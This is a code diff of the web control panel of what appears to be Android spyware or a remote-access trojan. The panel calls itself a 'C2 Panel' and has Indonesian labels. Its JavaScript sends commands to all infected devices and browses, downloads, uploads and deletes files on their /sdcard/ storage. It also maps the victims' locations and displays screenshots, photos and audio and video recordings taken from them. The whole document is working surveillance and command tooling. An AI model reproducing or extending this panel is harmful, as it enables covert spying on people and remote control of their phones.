-                div.innerHTML = '<span style="color:#e0e0e0;">📍 #' + (index + 1) + ' - ' + new Date(item.waktu).toLocaleString('id-ID') + '</span>' +
-                    '<a href="https://www.google.com/maps?q=' + lat + ',' + lon + '" target="_blank" class="map-btn">🗺️ Maps</a>';
-                locationList.appendChild(div);
-            }
-        }
-    });
-    
-    if (bounds.length > 0) {
-        map.fitBounds(bounds, { padding: [50, 50] });
-    }
+    if(bounds.length) map.fitBounds(bounds,{padding:[50,50]});
 }
+
+// ============================================================
+// C2 COMMANDS
+// ============================================================
+function renderC2Commands(){
+    var container=document.getElementById('cmdContainer'); container.innerHTML='';
+    Object.keys(C2_COMMANDS).forEach(catKey=>{
+        var cat=C2_COMMANDS[catKey]; var div=document.createElement('div'); div.className='cmd-category'; div.setAttribute('data-category',catKey);
+        var title=document.createElement('div'); title.className='cat-title'; title.innerHTML=cat.label+' <span class="count">'+cat.commands.length+'</span>'; div.appendChild(title);
+        var grid=document.createElement('div'); grid.className='cmd-grid';
+        cat.commands.forEach(cmd=>{
+            var btn=document.createElement('div'); btn.className='cmd-btn'; 
+            if(cmd.id.includes('uninstall')||cmd.id.includes('clear_')||cmd.id.includes('stop')) btn.className+=' danger';
+            else if(cmd.id.includes('start')||cmd.id.includes('record')) btn.className+=' success';
+            else if(cmd.id.includes('get')||cmd.id.includes('ambil')) btn.className+=' warning';
+            btn.textContent=cmd.label; btn.setAttribute('data-id',cmd.id); btn.setAttribute('data-param',cmd.param||'');
+            btn.onclick=function(){ var p=this.getAttribute('data-param'); if(p){ openParamModal(cmd.id,cmd.label,p); }else{ sendC2Command(cmd.id,''); } };
+            grid.appendChild(btn);
+        });
+        div.appendChild(grid); container.appendChild(div);
+    });
+}
+function filterCommands(){
+    var s=document.getElementById('cmdSearch').value.toLowerCase(), cat=document.getElementById('cmdCategoryFilter').value;
+    document.querySelectorAll('.cmd-category').forEach(c=>{
+        var show=!(cat&&c.getAttribute('data-category')!==cat);
+        var has=false; c.querySelectorAll('.cmd-btn').forEach(b=>{ var m=true; if(s&&!b.textContent.toLowerCase().includes(s)&&!b.getAttribute('data-id').includes(s)) m=false; b.style.display=m?'':'none'; if(m)has=true; });
+        c.style.display=(show&&has)?'':'none';
+    });
+}
+function openParamModal(cmdId,label,paramDesc){
+    var html='<h3 style="color:#4fc3f7;margin-bottom:12px">📤 '+label+'</h3><p style="color:#8899aa;margin-bottom:8px">Parameter: <strong>'+paramDesc+'</strong></p><input type="text" id="paramInput" placeholder="Enter parameter..." style="width:100%;padding:8px 12px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#c8d6e5;margin-bottom:12px;font-family:inherit;outline:none"><div style="display:flex;gap:8px"><button onclick="sendC2CommandWithParam(\''+cmdId+'\')" style="flex:1;padding:8px;border-radius:4px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;font-family:inherit">📤 Send</button><button onclick="closeModal()" style="flex:1;padding:8px;border-radius:4px;border:1px solid #1a2a3f;background:transparent;color:#8899aa;cursor:pointer;font-family:inherit">❌ Cancel</button></div>';
+    openModal(html);
+}
+function sendC2CommandWithParam(cmdId){ var p=document.getElementById('paramInput').value.trim(); closeModal(); sendC2Command(cmdId,p); }
+function sendC2Command(cmd,param){
+    addLog('c2','Sending: '+cmd+(param?' | '+param:''));
+    var data={command:cmd,target:'all',timestamp:Date.now()}; if(param){ if(param.includes('|')){ var parts=param.split('|'); data.param1=parts[0]||''; data.param2=parts[1]||''; }else data.param=param; }
+    fetch('/c2?key='+PASSWORD,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).then(r=>r.json()).then(d=>addLog('c2','Command sent: '+cmd+' - '+(d.status||'ok'))).catch(e=>addLog('error','Send failed: '+e.message));
+}
+function sendCustomCommand(){ var cmd=document.getElementById('customCmd').value.trim(); var param=document.getElementById('customParam').value.trim(); if(!cmd)return; sendC2Command(cmd,param); document.getElementById('customCmd').value=''; document.getElementById('customParam').value=''; }
+function showCmdResult(result){ var el=document.getElementById('cmdResult'); el.style.display='block'; el.textContent=typeof result==='object'?JSON.stringify(result,null,2):result; setTimeout(()=>el.style.display='none',15000); }
 
 // ============================================================
 // LOGS
 // ============================================================
-function addLog(type, message) {
-    var entry = { time: new Date().toLocaleTimeString('id-ID'), type: type, message: message };
-    logEntries.unshift(entry);
-    renderLogs();
+function addLog(type,msg){ var entry={time:new Date().toLocaleTimeString('id-ID'),type:type,message:msg}; logEntries.unshift(entry); renderLogs(); }
+function renderLogs(){
+    var area=document.getElementById('logArea'); var s=document.getElementById('logSearch').value.toLowerCase();
+    var filtered=logEntries.filter(e=>!s||e.message.toLowerCase().includes(s)||e.type.includes(s));
+    area.innerHTML=filtered.slice(0,300).map(e=>'<div class="log-entry"><span class="time">['+e.time+']</span><span class="type">['+e.type+']</span><span class="data">'+e.message+'</span></div>').join('');
 }
-
-function renderLogs() {
-    var area = document.getElementById('logArea');
-    var search = document.getElementById('logSearch').value.toLowerCase();
-    var filtered = logEntries;
-    if (search) {
-        filtered = filtered.filter(function(e) {
-            return e.message.toLowerCase().includes(search) || e.type.includes(search);
-        });
-    }
-    area.innerHTML = filtered.slice(0, 200).map(function(e) {
-        return '<div class="log-entry"><span class="time">[' + e.time + ']</span> <span class="type">[' + e.type + ']</span> <span class="data">' + e.message + '</span></div>';
-    }).join('');
-}
-
-function filterLogs() { renderLogs(); }
-function clearLogs() { logEntries = []; renderLogs(); }
+function filterLogs(){ renderLogs(); }
+function clearLogs(){ logEntries=[]; renderLogs(); }
 
 // ============================================================
 // MEDIA
 // ============================================================
-function renderMedia() {
-    var gallery = document.getElementById('mediaGallery');
-    gallery.innerHTML = '<div class="empty-state">⏳ Memuat media...</div>';
-    
-    fetch('/data?key=' + PASSWORD + '&limit=200')
-        .then(function(r) { return r.json(); })
-        .then(function(data) {
-            gallery.innerHTML = '';
-            
-            if (!data || !data.data || data.data.length === 0) {
-                gallery.innerHTML = '<div class="empty-state">📭 Belum ada data</div>';
-                return;
-            }
-            
-            var mediaItems = data.data.filter(function(item) {
-                var src = item.sumber || '';
-                return src.includes('screenshot') || 
-                       src.includes('photo') || 
-                       src.includes('gallery') ||
-                       src.includes('audio') ||
-                       src.includes('video') ||
-                       src.includes('image') ||
-                       src.includes('record') ||
-                       (typeof item.data === 'string' && item.data.startsWith('data:'));
-            });
-            
-            if (mediaItems.length === 0) {
-                gallery.innerHTML = '<div class="empty-state">📭 Tidak ada media</div>';
-                return;
-            }
-            
-            mediaItems.slice(0, 50).forEach(function(item) {
-                var card = document.createElement('div');
-                card.className = 'media-card';
-                card.onclick = function() { openMediaModal(item); };
-                
-                var dataStr = typeof item.data === 'string' ? item.data : JSON.stringify(item.data);
-                var isImage = dataStr.startsWith('data:image');
-                var isAudio = dataStr.startsWith('data:audio');
-                var isVideo = dataStr.startsWith('data:video');
-                
-                var previewHtml = '';
-                if (isImage && dataStr.length < 500000) {
-                    previewHtml = '<img src="' + dataStr + '" class="preview">';
-                } else if (isAudio) {
-                    previewHtml = '<div class="preview">🎵</div>';
-                } else if (isVideo) {
-                    previewHtml = '<div class="preview">🎬</div>';
-                } else {
-                    previewHtml = '<div class="preview">📄</div>';
-                }
-                
-                var time = new Date(item.waktu).toLocaleString('id-ID');
-                card.innerHTML = previewHtml + 
-                    '<div class="info"><span class="sumber">' + item.sumber + '</span><br>' + time + '</div>';
-                gallery.appendChild(card);
-            });
-        })
-        .catch(function(e) {
-            gallery.innerHTML = '<div class="empty-state">❌ Gagal memuat media: ' + e.message + '</div>';
+function renderMedia(){
+    var g=document.getElementById('mediaGallery'); g.innerHTML='<div class="empty-state">⏳ Loading media...</div>';
+    fetch('/data?key='+PASSWORD+'&limit=200').then(r=>r.json()).then(data=>{
+        g.innerHTML='';
+        if(!data||!data.data||!data.data.length){ g.innerHTML='<div class="empty-state">📭 No media data</div>'; return; }
+        var items=data.data.filter(item=>{
+            var src=item.sumber||'';
+            return src.includes('screenshot')||src.includes('photo')||src.includes('gallery')||src.includes('audio')||src.includes('video')||src.includes('image')||src.includes('record')||(typeof item.data==='string'&&item.data.startsWith('data:'));
         });
+        if(!items.length){ g.innerHTML='<div class="empty-state">📭 No media found</div>'; return; }
+        items.slice(0,40).forEach(item=>{
+            var card=document.createElement('div'); card.className='media-card'; card.onclick=function(){ openMediaModal(item); };
+            var ds=typeof item.data==='string'?item.data:JSON.stringify(item.data);
+            var isImg=ds.startsWith('data:image'), isAud=ds.startsWith('data:audio'), isVid=ds.startsWith('data:video');
+            var preview='';
+            if(isImg&&ds.length<500000) preview='<img src="'+ds+'" class="preview">';
+            else if(isAud) preview='<div class="preview">🎵</div>';
+            else if(isVid) preview='<div class="preview">🎬</div>';
+            else preview='<div class="preview">📄</div>';
+            var time=new Date(item.waktu).toLocaleString('id-ID');
+            card.innerHTML=preview+'<div class="info"><span class="sumber">'+item.sumber+'</span><span>'+time.split(',').pop()+'</span></div>';
+            g.appendChild(card);
+        });
+    }).catch(e=>{ g.innerHTML='<div class="empty-state">❌ Error: '+e.message+'</div>'; });
 }
-
-function openMediaModal(item) {
-    var dataStr = typeof item.data === 'string' ? item.data : JSON.stringify(item.data);
-    var isImage = dataStr.startsWith('data:image');
-    var isAudio = dataStr.startsWith('data:audio');
-    var isVideo = dataStr.startsWith('data:video');
-    
-    var html = '<h3 style="color:#4fc3f7;margin-bottom:10px">📸 ' + item.sumber + '</h3>';
-    html += '<p style="color:#8899aa;font-size:12px;margin-bottom:15px">' + new Date(item.waktu).toLocaleString('id-ID') + '</p>';
-    
-    if (isImage) {
-        html += '<img src="' + dataStr + '" style="max-width:100%;max-height:70vh;border-radius:8px;">';
-    } else if (isAudio) {
-        html += '<audio controls style="width:100%;margin:10px 0;" src="' + dataStr + '"></audio>';
-        html += '<div style="background:#050a12;padding:15px;border-radius:8px;max-height:300px;overflow:auto;font-size:11px;font-family:monospace;color:#8899aa;word-break:break-all;">' + dataStr.substring(0, 300) + '...</div>';
-    } else if (isVideo) {
-        html += '<video controls style="max-width:100%;max-height:70vh;border-radius:8px;" src="' + dataStr + '"></video>';
-    } else {
-        html += '<div style="background:#050a12;padding:15px;border-radius:8px;max-height:500px;overflow:auto;font-size:11px;font-family:monospace;color:#8899aa;word-break:break-all;">' + dataStr + '</div>';
-    }
-    
-    html += '<div style="margin-top:15px;display:flex;gap:10px;">';
-    html += '<button onclick="downloadMedia(\'' + dataStr + '\',\'' + item.sumber + '\')" style="flex:1;padding:8px;border-radius:6px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;">📥 Download</button>';
-    html += '<button onclick="closeModal()" style="flex:1;padding:8px;border-radius:6px;border:1px solid #2a3f5f;background:transparent;color:#8899aa;cursor:pointer;">❌ Tutup</button>';
-    html += '</div>';
-    
+function openMediaModal(item){
+    var ds=typeof item.data==='string'?item.data:JSON.stringify(item.data);
+    var isImg=ds.startsWith('data:image'), isAud=ds.startsWith('data:audio'), isVid=ds.startsWith('data:video');
+    var html='<h3 style="color:#4fc3f7;margin-bottom:8px">📸 '+item.sumber+'</h3><p style="color:#8899aa;font-size:11px;margin-bottom:12px">'+new Date(item.waktu).toLocaleString('id-ID')+'</p>';
+    if(isImg) html+='<img src="'+ds+'" style="max-width:100%;max-height:65vh;border-radius:6px;">';
+    else if(isAud) html+='<audio controls style="width:100%;margin:8px 0" src="'+ds+'"></audio><div style="background:#050a12;padding:12px;border-radius:4px;max-height:200px;overflow:auto;font-size:10px;font-family:monospace;color:#8899aa;word-break:break-all;">'+ds.substring(0,200)+'...</div>';
+    else if(isVid) html+='<video controls style="max-width:100%;max-height:60vh;border-radius:6px" src="'+ds+'"></video>';
+    else html+='<div style="background:#050a12;padding:12px;border-radius:4px;max-height:350px;overflow:auto;font-size:10px;font-family:monospace;color:#8899aa;word-break:break-all;">'+ds+'</div>';
+    html+='<div style="margin-top:12px;display:flex;gap:8px"><button onclick="downloadMedia(\''+ds+'\',\''+item.sumber+'\')" style="flex:1;padding:8px;border-radius:4px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;font-family:inherit">📥 Download</button><button onclick="closeModal()" style="flex:1;padding:8px;border-radius:4px;border:1px solid #1a2a3f;background:transparent;color:#8899aa;cursor:pointer;font-family:inherit">❌ Close</button></div>';
     openModal(html);
 }
-
-function downloadMedia(dataUrl, filename) {
-    try {
-        var link = document.createElement('a');
-        link.href = dataUrl;
-        var ext = 'png';
-        if (dataUrl.startsWith('data:image/jpeg')) ext = 'jpg';
-        else if (dataUrl.startsWith('data:image/png')) ext = 'png';
-        else if (dataUrl.startsWith('data:audio')) ext = 'mp3';
-        else if (dataUrl.startsWith('data:video')) ext = 'mp4';
-        else if (dataUrl.startsWith('data:application')) ext = 'bin';
-        link.download = filename + '_' + Date.now() + '.' + ext;
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-        addLog('info', 'Downloaded media: ' + filename);
-    } catch(e) {
-        alert('Gagal download: ' + e.message);
-    }
+function downloadMedia(dataUrl,filename){
+    try{ var link=document.createElement('a'); link.href=dataUrl; var ext='png'; if(dataUrl.startsWith('data:image/jpeg')) ext='jpg'; else if(dataUrl.startsWith('data:audio')) ext='mp3'; else if(dataUrl.startsWith('data:video')) ext='mp4'; else if(dataUrl.startsWith('data:application')) ext='bin'; link.download=filename+'_'+Date.now()+'.'+ext; document.body.appendChild(link); link.click(); document.body.removeChild(link); addLog('info','Downloaded: '+filename); }catch(e){ alert('Download failed: '+e.message); }
 }
 
 // ============================================================
 // FILES
 // ============================================================
-function renderFiles(path) {
-    currentFilePath = path || '/sdcard/';
-    var container = document.getElementById('fileList');
-    container.innerHTML = '<div style="text-align:center;color:#8899aa;padding:20px;">⏳ Memuat file...</div>';
-    
-    fetch('/data?key=' + PASSWORD + '&type=list_file&path=' + encodeURIComponent(currentFilePath))
-        .then(function(r) { return r.json(); })
-        .then(function(data) {
-            container.innerHTML = '';
-            
-            var breadcrumb = document.createElement('div');
-            breadcrumb.className = 'file-breadcrumb';
-            breadcrumb.innerHTML = '<span>📁</span>';
-            var parts = currentFilePath.replace(/^\/+/, '').split('/');
-            var currentPath = '';
-            parts.forEach(function(p, i) {
-                if (p) {
-                    currentPath += p + '/';
-                    breadcrumb.innerHTML += '<span onclick="renderFiles(\'' + currentPath + '\')">' + p + '</span>';
-                    if (i < parts.length - 1) breadcrumb.innerHTML += '<span style="color:#8899aa;">/</span>';
-                }
+function renderFiles(path){
+    currentFilePath=path||'/sdcard/';
+    var container=document.getElementById('fileList'); container.innerHTML='<div style="text-align:center;color:#8899aa;padding:20px;">⏳ Loading...</div>';
+    fetch('/data?key='+PASSWORD+'&type=list_file&path='+encodeURIComponent(currentFilePath)).then(r=>r.json()).then(data=>{
+        container.innerHTML='';
+        var bc=document.createElement('div'); bc.className='file-breadcrumb'; bc.innerHTML='<span>📁</span>';
+        var parts=currentFilePath.replace(/^\/+/,'').split('/'); var cp='';
+        parts.forEach((p,i)=>{ if(p){ cp+=p+'/'; bc.innerHTML+='<span onclick="renderFiles(\''+cp+'\')">'+p+'</span>'; if(i<parts.length-1)bc.innerHTML+='<span style="color:#8899aa;">/</span>'; }});
+        if(!currentFilePath||currentFilePath==='/sdcard/') bc.innerHTML+='<span style="color:#8899aa;">/sdcard/</span>';
+        container.appendChild(bc);
+        var list=document.createElement('div');
+        if(data&&data.files&&data.files.length){
+            var files=data.files; files.sort((a,b)=>{ if(a.isFolder&&!b.isFolder)return -1; if(!a.isFolder&&b.isFolder)return 1; return (a.name||'').localeCompare(b.name||''); });
+            files.forEach(f=>{
+                var item=document.createElement('div'); item.className='file-item';
+                var icon=f.isFolder?'📁':'📄', size=f.isFolder?'--':formatSize(f.size||0), fullPath=f.path||(currentFilePath+(f.name||''));
+                if(f.isFolder) item.onclick=function(){ renderFiles(fullPath+'/'); }; else item.onclick=function(){ openFileModal(fullPath); };
+                item.innerHTML='<div class="name">'+icon+' '+(f.name||'')+'</div><div style="display:flex;align-items:center;gap:12px"><span style="color:#8899aa;font-size:11px">'+size+'</span><div class="actions"><button class="download-btn" onclick="event.stopPropagation();downloadFile(\''+fullPath+'\')">📥</button><button class="delete-btn" onclick="event.stopPropagation();deleteFile(\''+fullPath+'\')">🗑️</button></div></div>';
+                list.appendChild(item);
             });
-            if (!currentFilePath || currentFilePath === '/sdcard/') {
-                breadcrumb.innerHTML += '<span style="color:#8899aa;">/sdcard/</span>';
-            }
-            container.appendChild(breadcrumb);
-            
-            var list = document.createElement('div');
-            
-            if (data && data.files && data.files.length > 0) {
-                var files = data.files;
-                files.sort(function(a, b) {
-                    if (a.isFolder && !b.isFolder) return -1;
-                    if (!a.isFolder && b.isFolder) return 1;
-                    return (a.name || '').localeCompare(b.name || '');
-                });
-                
-                files.forEach(function(file) {
-                    var item = document.createElement('div');
-                    item.className = 'file-item';
-                    
-                    var icon = file.isFolder ? '📁' : '📄';
-                    var size = file.isFolder ? '--' : formatSize(file.size || 0);
-                    var fullPath = file.path || (currentFilePath + (file.name || ''));
-                    
-                    if (file.isFolder) {
-                        item.onclick = function() { renderFiles(fullPath + '/'); };
-                    } else {
-                        item.onclick = function() { openFileModal(fullPath); };
-                    }
-                    
-                    item.innerHTML = 
-                        '<div class="name">' + icon + ' ' + (file.name || '') + '</div>' +
-                        '<div style="display:flex;align-items:center;gap:15px;">' +
-                        '<span class="size">' + size + '</span>' +
-                        '<div class="actions">' +
-                        '<button class="download-btn" onclick="event.stopPropagation();downloadFile(\'' + fullPath + '\')">📥</button>' +
-                        '<button class="delete-btn" onclick="event.stopPropagation();deleteFile(\'' + fullPath + '\')">🗑️</button>' +
-                        '</div>' +
-                        '</div>';
-                    
-                    list.appendChild(item);
-                });
-            } else {
-                list.innerHTML = '<div class="empty-state">📭 Tidak ada file di folder ini</div>';
-            }
-            
-            container.appendChild(list);
-        })
-        .catch(function(e) {
-            container.innerHTML = '<div class="empty-state">❌ Gagal memuat file: ' + e.message + '</div>';
-        });
+        }else{ list.innerHTML='<div class="empty-state">📭 Empty folder</div>'; }
+        container.appendChild(list);
+    }).catch(e=>{ container.innerHTML='<div class="empty-state">❌ Error: '+e.message+'</div>'; });
 }
-
-function formatSize(bytes) {
-    if (!bytes || bytes === 0) return '0 B';
-    if (bytes < 1024) return bytes + ' B';
-    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
-    if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
-    return (bytes / 1073741824).toFixed(1) + ' GB';
-}
-
-function openFileModal(filePath) {
-    var html = '<h3 style="color:#4fc3f7;margin-bottom:10px">📄 ' + filePath.split('/').pop() + '</h3>';
-    html += '<p style="color:#8899aa;font-size:12px;margin-bottom:15px">Path: ' + filePath + '</p>';
-    html += '<div style="text-align:center;padding:20px;color:#8899aa;">⏳ Memuat file...</div>';
+function formatSize(bytes){ if(!bytes||bytes===0)return '0 B'; if(bytes<1024)return bytes+' B'; if(bytes<1048576)return (bytes/1024).toFixed(1)+' KB'; if(bytes<1073741824)return (bytes/1048576).toFixed(1)+' MB'; return (bytes/1073741824).toFixed(1)+' GB'; }
+function openFileModal(path){
+    var html='<h3 style="color:#4fc3f7;margin-bottom:8px">📄 '+path.split('/').pop()+'</h3><p style="color:#8899aa;font-size:11px;margin-bottom:12px">'+path+'</p><div style="text-align:center;padding:20px;color:#8899aa;">⏳ Loading...</div>';
     openModal(html);
-    
-    fetch('/data?key=' + PASSWORD + '&type=ambil_file&path=' + encodeURIComponent(filePath))
-        .then(function(r) { return r.json(); })
-        .then(function(data) {
-            var body = document.getElementById('modalBody');
-            if (data && data.content) {
-                var content = data.content;
-                var isImage = content.startsWith('data:image');
-                var isText = !isImage && content.length < 50000;
-                
-                var htmlContent = '<h3 style="color:#4fc3f7;margin-bottom:10px">📄 ' + filePath.split('/').pop() + '</h3>';
-                htmlContent += '<p style="color:#8899aa;font-size:12px;margin-bottom:15px">Path: ' + filePath + '</p>';
-                
-                if (isImage) {
-                    htmlContent += '<img src="' + content + '" style="max-width:100%;max-height:70vh;border-radius:8px;">';
-                } else if (isText) {
-                    htmlContent += '<div style="background:#050a12;padding:15px;border-radius:8px;max-height:400px;overflow:auto;font-size:12px;font-family:monospace;color:#e0e0e0;white-space:pre-wrap;">' + content + '</div>';
-                } else {
-                    htmlContent += '<div style="background:#050a12;padding:15px;border-radius:8px;max-height:400px;overflow:auto;font-size:11px;font-family:monospace;color:#8899aa;word-break:break-all;">Binary file (' + content.length + ' chars)</div>';
-                }
-                
-                htmlContent += '<div style="margin-top:15px;display:flex;gap:10px;">';
-                htmlContent += '<button onclick="downloadFileDirect(\'' + filePath + '\')" style="flex:1;padding:8px;border-radius:6px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;">📥 Download</button>';
-                htmlContent += '<button onclick="closeModal()" style="flex:1;padding:8px;border-radius:6px;border:1px solid #2a3f5f;background:transparent;color:#8899aa;cursor:pointer;">❌ Tutup</button>';
-                htmlContent += '</div>';
-                
-                body.innerHTML = htmlContent;
-            } else {
-                body.innerHTML = '<div class="empty-state">❌ Gagal memuat file</div>';
-            }
-        })
-        .catch(function(e) {
-            document.getElementById('modalBody').innerHTML = '<div class="empty-state">❌ Error: ' + e.message + '</div>';
-        });
+    fetch('/data?key='+PASSWORD+'&type=ambil_file&path='+encodeURIComponent(path)).then(r=>r.json()).then(data=>{
+        var body=document.getElementById('modalBody');
+        if(data&&data.content){
+            var content=data.content; var isImg=content.startsWith('data:image'); var isText=!isImg&&content.length<50000;
+            var html2='<h3 style="color:#4fc3f7;margin-bottom:8px">📄 '+path.split('/').pop()+'</h3><p style="color:#8899aa;font-size:11px;margin-bottom:12px">'+path+'</p>';
+            if(isImg) html2+='<img src="'+content+'" style="max-width:100%;max-height:65vh;border-radius:6px;">';
+            else if(isText) html2+='<div style="background:#050a12;padding:12px;border-radius:4px;max-height:350px;overflow:auto;font-size:11px;font-family:monospace;color:#c8d6e5;white-space:pre-wrap;">'+content+'</div>';
+            else html2+='<div style="background:#050a12;padding:12px;border-radius:4px;max-height:350px;overflow:auto;font-size:10px;font-family:monospace;color:#8899aa;word-break:break-all;">Binary file ('+content.length+' chars)</div>';
+            html2+='<div style="margin-top:12px;display:flex;gap:8px"><button onclick="downloadFileDirect(\''+path+'\')" style="flex:1;padding:8px;border-radius:4px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;font-family:inherit">📥 Download</button><button onclick="closeModal()" style="flex:1;padding:8px;border-radius:4px;border:1px solid #1a2a3f;background:transparent;color:#8899aa;cursor:pointer;font-family:inherit">❌ Close</button></div>';
+            body.innerHTML=html2;
+        }else{ body.innerHTML='<div class="empty-state">❌ Failed to load file</div>'; }
+    }).catch(e=>{ document.getElementById('modalBody').innerHTML='<div class="empty-state">❌ Error: '+e.message+'</div>'; });
 }
-
-function downloadFile(filePath) {
-    fetch('/data?key=' + PASSWORD + '&type=ambil_file&path=' + encodeURIComponent(filePath))
-        .then(function(r) { return r.json(); })
-        .then(function(data) {
-            if (data && data.content) {
-                var content = data.content;
-                var fileName = filePath.split('/').pop();
-                var link = document.createElement('a');
-                link.href = content;
-                link.download = fileName;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                addLog('info', 'Downloaded: ' + fileName);
-            }
-        })
-        .catch(function(e) {
-            alert('Gagal download: ' + e.message);
-        });
-}
-
-function downloadFileDirect(filePath) {
-    downloadFile(filePath);
-    closeModal();
-}
-
-function deleteFile(filePath) {
-    if (!confirm('Hapus file ' + filePath + '?')) return;
-    
-    fetch('/data?key=' + PASSWORD + '&type=hapus_file&path=' + encodeURIComponent(filePath), {
-        method: 'DELETE'
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(data) {
-        if (data && data.success) {
-            addLog('info', 'Deleted: ' + filePath);
-            renderFiles(currentFilePath);
-        } else {
-            alert('Gagal hapus file');
-        }
-    })
-    .catch(function(e) {
-        alert('Error: ' + e.message);
-    });
-}
-
-function uploadFile() {
-    var input = document.createElement('input');
-    input.type = 'file';
-    input.onchange = function(e) {
-        var file = e.target.files[0];
-        if (!file) return;
-        
-        var reader = new FileReader();
-        reader.onload = function(ev) {
-            var data = ev.target.result;
-            var uploadPath = prompt('Path tujuan (contoh: /sdcard/Download/)', '/sdcard/Download/');
-            if (!uploadPath) return;
-            
-            fetch('/data?key=' + PASSWORD + '&type=upload_file&path=' + encodeURIComponent(uploadPath + file.name), {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ data: data, name: file.name })
-            })
-            .then(function(r) { return r.json(); })
-            .then(function(data) {
-                if (data && data.success) {
-                    addLog('info', 'Uploaded: ' + file.name);
-                    renderFiles(currentFilePath);
-                } else {
-                    alert('Gagal upload file');
-                }
-            })
-            .catch(function(e) {
-                alert('Error: ' + e.message);
-            });
-        };
-        reader.readAsDataURL(file);
-    };
-    input.click();
-}
+function downloadFile(path){ fetch('/data?key='+PASSWORD+'&type=ambil_file&path='+encodeURIComponent(path)).then(r=>r.json()).then(data=>{ if(data&&data.content){ var link=document.createElement('a'); link.href=data.content; link.download=path.split('/').pop(); document.body.appendChild(link); link.click(); document.body.removeChild(link); addLog('info','Downloaded: '+path); } }).catch(e=>alert('Download failed: '+e.message)); }
+function downloadFileDirect(path){ downloadFile(path); closeModal(); }
+function deleteFile(path){ if(!confirm('Delete '+path+'?'))return; fetch('/data?key='+PASSWORD+'&type=hapus_file&path='+encodeURIComponent(path),{method:'DELETE'}).then(r=>r.json()).then(data=>{ if(data&&data.success){ addLog('info','Deleted: '+path); renderFiles(currentFilePath); }else alert('Delete failed'); }).catch(e=>alert('Error: '+e.message)); }
+function uploadFile(){ var input=document.createElement('input'); input.type='file'; input.onchange=function(e){ var file=e.target.files[0]; if(!file)return; var reader=new FileReader(); reader.onload=function(ev){ var data=ev.target.result; var path=prompt('Destination path (e.g. /sdcard/Download/)','/sdcard/Download/'); if(!path)return; fetch('/data?key='+PASSWORD+'&type=upload_file&path='+encodeURIComponent(path+file.name),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:data,name:file.name})}).then(r=>r.json()).then(d=>{ if(d&&d.success){ addLog('info','Uploaded: '+file.name); renderFiles(currentFilePath); }else alert('Upload failed'); }).catch(e=>alert('Error: '+e.message)); }; reader.readAsDataURL(file); }; input.click(); }
 
 // ============================================================
 // MODAL
 // ============================================================
-function openModal(content) {
-    document.getElementById('modalBody').innerHTML = content;
-    document.getElementById('modal').classList.add('active');
-}
-function closeModal() {
-    document.getElementById('modal').classList.remove('active');
-}
+function openModal(content){ document.getElementById('modalBody').innerHTML=content; document.getElementById('modal').classList.add('active'); }
+function closeModal(){ document.getElementById('modal').classList.remove('active'); }
+document.addEventListener('keydown',function(e){ if(e.key==='Escape')closeModal(); });
 
-// ============================================================
-// KEYBOARD SHORTCUT
-// ============================================================
-document.addEventListener('keydown', function(e) {
-    if (e.key === 'Escape') { closeModal(); }
-});
-
-console.log('✅ Dashboard ULTIMATE v4.0 loaded - 48 Commands!');
-console.log('✅ Media & Files panels are REAL and functional!');
-console.log('✅ Maps panel - click location to open Google Maps!');
+console.log('☠️ C2 Panel Ultimate v4.0 loaded');
+console.log('📊 48 commands, 14 stats, map, media, files');
 </script>
 </body>
 </html>
